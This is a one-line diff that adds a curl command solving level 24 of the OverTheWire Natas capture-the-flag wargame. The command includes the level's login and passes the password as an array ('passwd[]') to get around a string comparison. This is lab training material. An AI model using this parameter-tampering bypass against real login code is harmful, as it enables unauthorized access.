@@ -1,0 +1,1 @@
+curl -XGET -u natas24:0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r http://natas24.natas.labs.overthewire.org/?passwd%5b%5d
